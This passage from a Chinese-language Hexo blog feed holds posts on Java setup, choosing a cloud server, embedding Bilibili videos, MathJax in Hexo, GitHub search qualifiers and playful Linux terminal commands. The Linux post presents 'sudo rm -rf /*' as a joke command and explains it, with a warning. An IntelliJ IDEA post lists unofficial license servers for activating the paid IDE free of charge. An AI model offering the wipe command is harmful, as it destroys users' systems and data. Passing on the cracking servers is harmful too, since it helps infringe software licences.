src="https://i.loli.net/2019/11/22/emZEnRfT9u23GPz.jpg"></a></p><h2 id="检验环境变量是否配置成功"><a href="#检验环境变量是否配置成功" class="headerlink" title="检验环境变量是否配置成功"></a>检验环境变量是否配置成功</h2><p>Win+R打开dos窗口，分别输入java  ,javac  ,java –version</p><p><a href="https://sm.ms/image/r5b3kVQNGmIe6wf" target="_blank"><img src="https://i.loli.net/2019/11/22/r5b3kVQNGmIe6wf.jpg"></a></p><p>如果你看到以上的内容，那么，恭喜，你的JAVA开发环境搭建成功了^_^。 </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;软件开发环境，是一个程序的运行的支撑，Java作为近年来最热门的编程语言之一，越来越多的新人程序员选择Java来学习，它的开发环境搭建也是学习和使用这一编程语言的基础。&lt;br&gt;今天我们将在Windows上配置Java的开发环境。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="配置Java环境" scheme="http://yoursite.com/tags/%E9%85%8D%E7%BD%AEJava%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
  <entry>
    <title>服务器选购指南</title>
    <link href="http://yoursite.com/2019/11/18/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%89%E8%B4%AD%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2019/11/18/服务器选购指南/</id>
    <published>2019-11-18T12:09:11.000Z</published>
    <updated>2019-11-18T12:20:17.860Z</updated>
    
    <content type="html"><![CDATA[<p>有钱人该不该玩服务器？</p><a id="more"></a><h1 id="我该不该买服务器"><a href="#我该不该买服务器" class="headerlink" title="我该不该买服务器"></a>我该不该买服务器</h1><p>既然说到了服务器的选购，那么第一个问题当然是确定是否真的有这方面的需求。毕竟服务器一般都不便宜！ 而且买好服务器后还要各种备案折腾，很是麻烦！</p><p><strong>如果你只是想简单的写写博客</strong>，那么建议直接在简书、掘金、CSDN、博客园等第三方的博客平台上写，这样能更专注于内容的创作。或者是也可以在 github 上搭建一个 hexo 博客，即能满足自定义的需求，也更有极客范。</p><p><strong>如果只是想体验一下网站建设</strong>，那么可以在本地装个虚拟机体验或者是使用诸如<a href="https://www.xp.cn/" target="_blank" rel="noopener">PhpStudy</a> 这类的集成环境。</p><p><strong>如果你是真的想拥有一个属于自己的网站，并确定能够坚持维护下去而不是三分钟热度</strong>，这时才可以考虑入手一个服务器。</p><h1 id="选择云服务器还是网站空间"><a href="#选择云服务器还是网站空间" class="headerlink" title="选择云服务器还是网站空间"></a>选择云服务器还是网站空间</h1><p><strong>云服务器</strong>：又称作“云主机”。简单点说就是一个远程的电脑，灵活性非常高，可以自由选择操作系统，可以在上面运行各种程序！正因为灵活性高，所以运行环境配置起来相对复杂，价格也偏高。</p><p><strong>网站空间</strong>：又称作“虚拟主机”、“建站主机”。可配置项较少但使用起来很简单，购买后只需将网站程序上传即可使用，价格便宜。</p><p>总的来说，网站空间适合入门使用或者是挂一些功能简单的网站页面。如果要追求各种 DIY 以及运行大型网站程序，当然<strong>首选云服务器</strong>。</p><h1 id="选择-Windows-系统还是-Linux-系统"><a href="#选择-Windows-系统还是-Linux-系统" class="headerlink" title="选择 Windows 系统还是 Linux 系统"></a>选择 Windows 系统还是 Linux 系统</h1><p><a href="https://sm.ms/image/REeyT4wC2Xzvbqa" target="_blank"><img src="https://i.loli.net/2019/11/18/REeyT4wC2Xzvbqa.png"></a></p><p>很多新手可能以为 Windows 相对熟悉而选择 Windows 系统来建站，其实这就掉了一个大坑！Windows 的服务器图形界面虽然看上去“直观”，但要找到想要的设置项得一层层地找下去，很容易让人“找不着北”。而在 Linux 上，一般就一行命令就搞定了，又酷又高效快捷。</p><p>除此之外，在服务器软件方面，无论是运行效率还是兼容性还是安全性，Linux 都要优于 Windows。</p><p>现在，借助于<a href="https://www.bt.cn/?invite_code=MV93bXRodnA=" target="_blank" rel="noopener">宝塔</a> 、<a href="https://www.xp.cn/" target="_blank" rel="noopener">PhpStudy</a> 、<a href="http://amh.sh/" target="_blank" rel="noopener">AMH</a> 等服务器面板，Linux 服务器的上手也变得异常简单，完全不用担心不会用的问题。</p><p>Linux(Unix)家族有许多系统分支，常见的有 CentOS、Ubuntu、Debian、Fedora、Deepin 等。一般来说选 CentOS 就行了（其它的几个我也没用过……）。</p><h1 id="带宽与配置"><a href="#带宽与配置" class="headerlink" title="带宽与配置"></a>带宽与配置</h1><p>对于个人网站，最低配置的那种服务器（1 核 1G 内存 1MB 带宽）完全够用了！经过实测，该配置只要优化得好，完全能扛得动 1万IP/天 的网站。1万IP/天 是什么概念？我这种”知名“大网站日 IP 也才几百……</p><h1 id="服务器地域选择"><a href="#服务器地域选择" class="headerlink" title="服务器地域选择"></a>服务器地域选择</h1><p>各家的云产品都提供了多处地域选择。一般来说也就分为两种：大陆地区的服务器和非大陆地区的服务器。选用大陆地区的服务器网站访问速度快，但需要进行备案；选用非大陆地区的服务器则不需要备案，但访问延迟略高。除此之外没有什么讲究，哪种便宜就选哪种好了……</p><h1 id="服务商选择"><a href="#服务商选择" class="headerlink" title="服务商选择"></a>服务商选择</h1><p>一定要选择大厂的服务器！！！那些不知名小厂的服务器虽然价格便宜些，但指不定哪天就跑路了，没有安全保障。同时在售后服务上大厂也会更加完善，遇到什么问题发个工单立马给你安排的明明白白，不会有后顾之忧。</p><p>国内比较靠谱的云服务商有：<strong>腾讯云（俗称“良心云”）、阿里云（前万网，俗称“套路云”）、华为云（后起之秀）、西部数码、景安网络、百度云（不是百度网盘！）、京东云、美团云……</strong> 这些云服务商中，我只深度使用过<strong>腾讯云与阿里云</strong>，个人感觉腾讯云的价格稍微便宜点，工单的处理速度也快一点。其它的不作评价。</p><p>因为网站备案是跟着服务商跑的，备案好的网站如果更换了服务商需要重新备案，因此一般来说一旦选择了一家服务商后很难再换成其他的服务商（主要是麻烦……）</p><h1 id="一些小-Tip"><a href="#一些小-Tip" class="headerlink" title="一些小 Tip"></a>一些小 Tip</h1><ol><li><p>买服务器时最好一次买几年，这样价格相对来说要便宜不少。而且服务器续费一般没有优惠，贼贵！</p></li><li><p>服务器到期后建议直接再买个新的，而不是续费。原因同上条。买个新的服务器后可以利用硬盘快照功能直接将旧服务器上的数据整个儿搬到新服务器上，简单快捷。</p></li><li><p>买服务器一定要趁有活动时入手，比如说就是现在，各家厂商都在进行双十一活动，简直都是白菜价了！</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有钱人该不该玩服务器？&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="服务器选购" scheme="http://yoursite.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%89%E8%B4%AD/"/>
    
  </entry>
  
  <entry>
    <title>博客嵌入可以自适应的b站视频</title>
    <link href="http://yoursite.com/2019/11/18/%E5%8D%9A%E5%AE%A2%E5%B5%8C%E5%85%A5%E5%8F%AF%E4%BB%A5%E8%87%AA%E9%80%82%E5%BA%94%E7%9A%84b%E7%AB%99%E8%A7%86%E9%A2%91/"/>
    <id>http://yoursite.com/2019/11/18/博客嵌入可以自适应的b站视频/</id>
    <published>2019-11-18T05:32:24.000Z</published>
    <updated>2019-11-18T05:37:18.458Z</updated>
    
    <content type="html"><![CDATA[<p>写博客的时候准备插入一个B站视频，发现B站点击分享会提供iframe嵌入视频，直接复制代码。</p><a id="more"></a><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"//player.bilibili.com/player.html?aid=44020824&amp;page=1"</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">"no"</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">"no"</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">allowfullscreen</span>=<span class="hljs-string">"true"</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>添加到了博客里，然而它默认的样式只有很小的一块，还需要手动添加width和height属性，手动设置了固定的宽和高之后，显示正常，本以为大功告成。结果发下移动端边框超出。</p><p>于是参考网上资料，有直接修改主题样式的，使之外嵌一个class样式，但是一直测试失败。尝试多次后，才找到合适的解决办法，使用也非常简单。</p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"spkj"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://player.bilibili.com/player.html?aid=44020824&amp;page=1"</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">"no"</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">"no"</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">allowfullscreen</span>=<span class="hljs-string">"true"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span>  </span><br><span class="line">document.getElementById("spkj").style.height=document.getElementById("spkj").scrollWidth*0.76+"px";</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用方法：</p><p>只需<strong>替换第一行中的数字</strong>ID44020824 即可，所以每次只需插入B站视频av/XXXXXX的数字即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;写博客的时候准备插入一个B站视频，发现B站点击分享会提供iframe嵌入视频，直接复制代码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="b站视频嵌入" scheme="http://yoursite.com/tags/b%E7%AB%99%E8%A7%86%E9%A2%91%E5%B5%8C%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>在Hexo中渲染MathJax数学公式</title>
    <link href="http://yoursite.com/2019/11/17/%E5%9C%A8Hexo%E4%B8%AD%E6%B8%B2%E6%9F%93MathJax%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/"/>
    <id>http://yoursite.com/2019/11/17/在Hexo中渲染MathJax数学公式/</id>
    <published>2019-11-17T12:38:08.000Z</published>
    <updated>2019-11-17T13:20:17.426Z</updated>
    
    <content type="html"><![CDATA[<p>在用Markdown写技术文档时，免不了会碰到数学公式。常用的Markdown编辑器都会集成<a href="https://www.mathjax.org/" target="_blank" rel="noopener">Mathjax</a> ，用来渲染文档中的类Latex格式书写的数学公式。基于Hexo搭建的个人博客，默认情况下渲染数学公式却会出现各种各样的问题。</p><a id="more"></a><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>Hexo默认使用”hexo-renderer-marked”引擎渲染网页，该引擎会把一些特殊的markdown符号转换为相应的html标签，比如在markdown语法中，下划线’_’代表斜体，会被渲染引擎处理为<em>标签。</em></p><p>因为类Latex格式书写的数学公式下划线 ‘_’ 表示下标，有特殊的含义，如果被强制转换为<em>标签，那么MathJax引擎在渲染数学公式的时候就会出错。例如，$x_i$在开始被渲染的时候，处理为$x<em>i</em>$，这样MathJax引擎就认为该公式有语法错误，因为不会渲染。</em></p><p>类似的语义冲突的符号还包括’*’, ‘{‘, ‘}’, ‘&#39;等。</p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>更换Hexo的markdown渲染引擎，<a href="https://github.com/sun11/hexo-renderer-kramed" target="_blank" rel="noopener">hexo-renderer-kramed</a> 引擎是在默认的渲染引擎<a href="https://github.com/hexojs/hexo-renderer-marked" target="_blank" rel="noopener">hexo-renderer-marked</a> 的基础上修改了一些bug，两者比较接近，也比较轻量级。</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure><p>执行上面的命令即可，先卸载原来的渲染引擎，再安装新的。</p><p>然后，跟换引擎后行间公式可以正确渲染了，但是这样还没有完全解决问题，行内公式的渲染还是有问题，因为<a href="https://github.com/sun11/hexo-renderer-kramed" target="_blank" rel="noopener">hexo-renderer-kramed</a> 引擎也有语义冲突的问题。接下来到博客根目录下，找到node_modules\kramed\lib\rules\inline.js，把第11行的escape变量的值做相应的修改：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//  escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span><br><span class="line">  escape: /^\\([`*\[\]()#$+\-.!_&gt;])/</span><br></pre></td></tr></table></figure><p>这一步是在原基础上取消了对,{,}的转义(escape)。<br>同时把第20行的em变量也要做相应的修改。</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//  em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br><span class="line">  em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span><br></pre></td></tr></table></figure><p>重新启动hexo（先clean再generate）,问题完美解决。哦，如果不幸还没解决的话，看看是不是还需要在使用的主题中配置mathjax开关。</p><h1 id="在主题中开启mathjax开关"><a href="#在主题中开启mathjax开关" class="headerlink" title="在主题中开启mathjax开关"></a>在主题中开启mathjax开关</h1><p>如何使用主题了，别忘了在主题（Theme）中开启mathjax开关，下面以next主题为例，介绍下如何打开mathjax开关。</p><p>进入到主题目录，找到_config.yml配置问题，把mathjax默认的false修改为true，具体如下：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># MathJax Support</span><br><span class="line">mathjax:</span><br><span class="line">  enable: true</span><br><span class="line">  per_page: true</span><br></pre></td></tr></table></figure><p>别着急，这样还不够，还需要在文章的Front-matter里打开mathjax开关，如下：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: index.html</span><br><span class="line">date: 2016-12-28 21:01:30</span><br><span class="line">tags:</span><br><span class="line">mathjax: true</span><br><span class="line">--</span><br></pre></td></tr></table></figure><p>不要嫌麻烦，之所以要在文章头里设置开关，是因为考虑只有在用到公式的页面才加载 Mathjax，这样不需要渲染数学公式的页面的访问速度就不会受到影响了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在用Markdown写技术文档时，免不了会碰到数学公式。常用的Markdown编辑器都会集成&lt;a href=&quot;https://www.mathjax.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Mathjax&lt;/a&gt; ，用来渲染文档中的类Latex格式书写的数学公式。基于Hexo搭建的个人博客，默认情况下渲染数学公式却会出现各种各样的问题。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="渲染MathJax" scheme="http://yoursite.com/tags/%E6%B8%B2%E6%9F%93MathJax/"/>
    
  </entry>
  
  <entry>
    <title>Github的高级搜索</title>
    <link href="http://yoursite.com/2019/11/15/Github%E7%9A%84%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2/"/>
    <id>http://yoursite.com/2019/11/15/Github的高级搜索/</id>
    <published>2019-11-15T10:55:46.000Z</published>
    <updated>2019-11-15T11:58:53.551Z</updated>
    
    <content type="html"><![CDATA[<p>我没什么不舍</p><a id="more"></a><table><thead><tr><th align="left">搜索条件</th><th align="center">使用方法</th><th align="center">备注</th></tr></thead><tbody><tr><td align="left">location:</td><td align="center">location:china</td><td align="center">匹配填写的地址在china的开发者</td></tr><tr><td align="left">language:</td><td align="center">language:python</td><td align="center">匹配开发语言为python的项目</td></tr><tr><td align="left">followers:</td><td align="center">followers:&gt;=1000</td><td align="center">匹配拥有超过1000名关注着的项目</td></tr><tr><td align="left">in:name</td><td align="center">in:name Wangrongsheng</td><td align="center">匹配用户名为Wangrongsheng的开发者</td></tr><tr><td align="left">in:descripton</td><td align="center">in:descripton python</td><td align="center">匹配仓库描述里面有python的项目</td></tr><tr><td align="left">in:readme</td><td align="center">in:readme python</td><td align="center">匹配README描述中有python的项目</td></tr><tr><td align="left">stars:</td><td align="center">stars:&gt;=500</td><td align="center">匹配收藏数量超过500的项目</td></tr><tr><td align="left">forks:</td><td align="center">forks:&gt;=500；forks: 10..20</td><td align="center">匹配分支数量超过500的项目；匹配分支数量为10-20的项目</td></tr><tr><td align="left">size:</td><td align="center">size:&gt;=5000</td><td align="center">匹配仓库大于5000KB的仓库</td></tr><tr><td align="left">created:</td><td align="center">created:&gt;2019-01-01</td><td align="center">匹配2019年以后创建的仓库</td></tr><tr><td align="left">pushed:</td><td align="center">pushed:&gt;2019-01-01</td><td align="center">匹配仓库最近一次提交在2019年以后的仓库</td></tr><tr><td align="left">license:</td><td align="center">license:apache-2.0</td><td align="center">匹配使用 apache-2.0 协议的仓库</td></tr><tr><td align="left">user:</td><td align="center">user:google</td><td align="center">匹配用户google 上传的仓库</td></tr><tr><td align="left">org:</td><td align="center">org:spring-cloud</td><td align="center">匹配列出org的spring-cloud仓库</td></tr><tr><td align="left">Awesome + 关键字</td><td align="center">神器关键字</td><td align="center">帮助找到优秀的工具列表</td></tr></tbody></table><p>除此之外，这些可以<strong>组合搜索</strong>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我没什么不舍&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="Github高级搜索" scheme="http://yoursite.com/tags/Github%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>好玩的Linux命令</title>
    <link href="http://yoursite.com/2019/11/13/%E5%A5%BD%E7%8E%A9%E7%9A%84Linux%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2019/11/13/好玩的Linux命令/</id>
    <published>2019-11-13T12:23:42.000Z</published>
    <updated>2019-11-13T12:38:51.406Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>注：本文命令均实验于Ubuntu桌面系统环境</p></blockquote><a id="more"></a><h2 id="1-追鼠标的小猫"><a href="#1-追鼠标的小猫" class="headerlink" title="1.追鼠标的小猫"></a>1.追鼠标的小猫</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install oneko</span><br><span class="line">oneko</span><br></pre></td></tr></table></figure><p><a href="https://sm.ms/image/VKciaFuOP9BphH6" target="_blank"><img src="https://i.loli.net/2019/11/13/VKciaFuOP9BphH6.gif"></a></p><blockquote><p>注意，本命令只能在桌面所在的命令行界面输入，在远程ssh界面会显示“oneko:Can’t open display”</p></blockquote><h2 id="2-炫酷仪表盘"><a href="#2-炫酷仪表盘" class="headerlink" title="2.炫酷仪表盘"></a>2.炫酷仪表盘</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install npm</span><br><span class="line">sudo apt install nodejs-legacy</span><br><span class="line">git clone https://github.com/yaronn/blessed-contrib.git</span><br><span class="line">cd blessed-contrib</span><br><span class="line">npm install</span><br><span class="line">node ./examples/dashboard.js</span><br></pre></td></tr></table></figure><p><a href="https://sm.ms/image/wFAeK5qfNPot2MS" target="_blank"><img src="https://i.loli.net/2019/11/13/wFAeK5qfNPot2MS.gif"></a></p><h2 id="3-图片转ASCII画风"><a href="#3-图片转ASCII画风" class="headerlink" title="3.图片转ASCII画风"></a>3.图片转ASCII画风</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install aview imagemagick</span><br><span class="line">wget http://labfile.oss.aliyuncs.com/courses/1/Linus.png</span><br><span class="line">asciiview Linus.png</span><br></pre></td></tr></table></figure><p><a href="https://sm.ms/image/J6uhi4InH2kQVlE" target="_blank"><img src="https://i.loli.net/2019/11/13/J6uhi4InH2kQVlE.jpg"></a></p><h2 id="4-ASCII艺术框"><a href="#4-ASCII艺术框" class="headerlink" title="4.ASCII艺术框"></a>4.ASCII艺术框</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install boxes</span><br><span class="line">echo "Tongji Univerisity" | boxes</span><br><span class="line">echo "Tongji Univerisity" | boxes -d dog</span><br><span class="line">fortune | boxes -d cat | lolcat</span><br></pre></td></tr></table></figure><p><a href="https://sm.ms/image/B2a8iYQ7gkt3nzW" target="_blank"><img src="https://i.loli.net/2019/11/13/B2a8iYQ7gkt3nzW.jpg"></a></p><h2 id="5-字符串起火"><a href="#5-字符串起火" class="headerlink" title="5.字符串起火"></a>5.字符串起火</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libaa-bin</span><br><span class="line">aafire</span><br></pre></td></tr></table></figure><p><a href="https://sm.ms/image/3yLSoq7i4z5uQcV" target="_blank"><img src="https://i.loli.net/2019/11/13/3yLSoq7i4z5uQcV.gif"></a></p><h2 id="6-呜呜呜小火车"><a href="#6-呜呜呜小火车" class="headerlink" title="6.呜呜呜小火车"></a>6.呜呜呜小火车</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install sl</span><br><span class="line">sl-h</span><br></pre></td></tr></table></figure><p><a href="https://sm.ms/image/gWltx2U1zjSHeVI" target="_blank"><img src="https://i.loli.net/2019/11/13/gWltx2U1zjSHeVI.gif"></a></p><h2 id="7-终极解君忧命令！"><a href="#7-终极解君忧命令！" class="headerlink" title="7.终极解君忧命令！"></a>7.终极解君忧命令！</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /*</span><br></pre></td></tr></table></figure><ul><li>sudo：获取root管理员权限</li><li>rm：remove，即删除</li><li>rf：r表示递归删除，即删除所有的子目录，f表示不需要再进行确认</li><li>/：根目录</li><li>*：所有文件</li></ul><p>执行效果：</p><p><a href="https://sm.ms/image/fDrwn8lyUjXqtc7" target="_blank"><img src="https://i.loli.net/2019/11/13/fDrwn8lyUjXqtc7.gif"></a></p><blockquote><p>友情郑重提示：千万不要轻易尝试这个命令，特别是在运行有网站服务器、数据库的Linux主机上！</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;注：本文命令均实验于Ubuntu桌面系统环境&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="好玩命令" scheme="http://yoursite.com/tags/%E5%A5%BD%E7%8E%A9%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Intellij Idea免费激活使用（2017.1.1版本）</title>
    <link href="http://yoursite.com/2019/11/11/Intellij-Idea%E5%85%8D%E8%B4%B9%E6%BF%80%E6%B4%BB%E4%BD%BF%E7%94%A8%EF%BC%882017-1-1%E7%89%88%E6%9C%AC%EF%BC%89/"/>
    <id>http://yoursite.com/2019/11/11/Intellij-Idea免费激活使用（2017-1-1版本）/</id>
    <published>2019-11-11T04:43:29.000Z</published>
    <updated>2019-11-11T04:55:19.617Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>IDEA 全称 IntelliJ IDEA，是java编程语言开发的集成环境。IntelliJ在业界被公认为最好的java开发工具，尤其在智能代码助手、代码自动提示、重构、J2EE支持、各类版本工具(git、svn等)、JUnit、CVS整合、代码分析、 创新的GUI设计等方面的功能可以说是超常的。IDEA是JetBrains公司的产品，这家公司总部位于捷克共和国的首都布拉格，开发人员以严谨著称的东欧程序员为主。它的旗舰版本还支持HTML，CSS，PHP，MySQL，Python等。免费版只支持Python等少数语言。</p></blockquote><a id="more"></a><p><strong>这里的安装的是Intellij Idea的2017年1月1日的版本。</strong></p><h1 id="一、简易安装方法"><a href="#一、简易安装方法" class="headerlink" title="一、简易安装方法"></a>一、简易安装方法</h1><h2 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h2><p><a href="https://pan.baidu.com/s/1L5SW_Ongi0H67NskycEYhw" target="_blank" rel="noopener">网盘下载</a>  提取码：anwm</p><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h2><p><a href="https://sm.ms/image/L7mJ6V3IszHYcxd" target="_blank"><img src="https://i.loli.net/2019/11/11/L7mJ6V3IszHYcxd.png"></a><br><a href="https://sm.ms/image/6mEvMrN3a2IDUJO" target="_blank"><img src="https://i.loli.net/2019/11/11/6mEvMrN3a2IDUJO.png"></a><br><a href="https://sm.ms/image/qlY54Py1dJTWXoC" target="_blank"><img src="https://i.loli.net/2019/11/11/qlY54Py1dJTWXoC.png"></a><br><a href="https://sm.ms/image/BxrL93dVYMu21is" target="_blank"><img src="https://i.loli.net/2019/11/11/BxrL93dVYMu21is.png"></a><br><a href="https://sm.ms/image/U5Z7Txor384G9B1" target="_blank"><img src="https://i.loli.net/2019/11/11/U5Z7Txor384G9B1.png"></a><br><a href="https://sm.ms/image/Zlef6cR9SXwQGyr" target="_blank"><img src="https://i.loli.net/2019/11/11/Zlef6cR9SXwQGyr.png"></a></p><h2 id="3-激活"><a href="#3-激活" class="headerlink" title="3.激活"></a>3.激活</h2><p><a href="https://sm.ms/image/zIZ1dm7iDtXOKcq" target="_blank"><img src="https://i.loli.net/2019/11/11/zIZ1dm7iDtXOKcq.png"></a></p><p>填入下面任意的一个license server:</p><ul><li><a href="http://intellij.mandroid.cn/" target="_blank" rel="noopener">http://intellij.mandroid.cn/</a>   </li><li><a href="http://idea.iblue.me/" target="_blank" rel="noopener">http://idea.iblue.me/</a></li><li><a href="http://idea.imsxm.com/" target="_blank" rel="noopener">http://idea.imsxm.com/</a></li><li><a href="http://idea.iteblog.com/key.php" target="_blank" rel="noopener">http://idea.iteblog.com/key.php</a></li></ul><p><a href="https://sm.ms/image/hMwjmZi5B6NWIOn" target="_blank"><img src="https://i.loli.net/2019/11/11/hMwjmZi5B6NWIOn.png"></a></p><h1 id="二、精细安装"><a href="#二、精细安装" class="headerlink" title="二、精细安装"></a>二、精细安装</h1><p><a href="https://blog.csdn.net/niuniu1994/article/details/82728327" target="_blank" rel="noopener">参考文章</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;IDEA 全称 IntelliJ IDEA，是java编程语言开发的集成环境。IntelliJ在业界被公认为最好的java开发工具，尤其在智能代码助手、代码自动提示、重构、J2EE支持、各类版本工具(git、svn等)、JUnit、CVS整合、代码分析、 创新的GUI设计等方面的功能可以说是超常的。IDEA是JetBrains公司的产品，这家公司总部位于捷克共和国的首都布拉格，开发人员以严谨著称的东欧程序员为主。它的旗舰版本还支持HTML，CSS，PHP，MySQL，Python等。免费版只支持Python等少数语言。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="Intellij Idea安装" scheme="http://yoursite.com/tags/Intellij-Idea%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>LaTex的安装和使用</title>
    <link href="http://yoursite.com/2019/11/10/LaTex%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2019/11/10/LaTex的安装和使用/</id>
    <published>2019-11-10T13:59:27.000Z</published>
    <updated>2019-11-10T14:20:57.345Z</updated>
    
